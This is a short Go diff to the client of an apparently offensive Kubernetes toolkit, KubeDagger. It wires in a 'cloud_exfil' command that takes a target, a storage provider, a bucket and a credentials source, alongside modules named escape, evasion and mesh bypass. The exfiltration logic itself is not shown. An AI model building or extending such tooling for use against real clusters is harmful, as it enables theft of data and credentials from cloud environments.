@@ -24,6 +24,7 @@ import (
 	"github.com/sirupsen/logrus"
 	"github.com/spf13/cobra"
 
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/cloud_exfil"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/cloud_meta"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/escape"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/evasion"
@@ -250,6 +251,11 @@ func netBypassCmd(cmd *cobra.Command, args []string) error {
 func meshBypassCmd(cmd *cobra.Command, args []string) error {
 	logrus.SetLevel(options.LogLevel)
 	return meshbypass.Execute(options.Target, options.MeshBypassMode, options.MeshTarget, options.Output)
+}
+
+func cloudExfilCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return cloud_exfil.Execute(options.Target, options.ExfilProvider, options.ExfilBucket, options.ExfilPath, options.ExfilCredsFrom, options.Output)
 }
 
 func getNetworkDiscoveryCmd(cmd *cobra.Command, args []string) error {
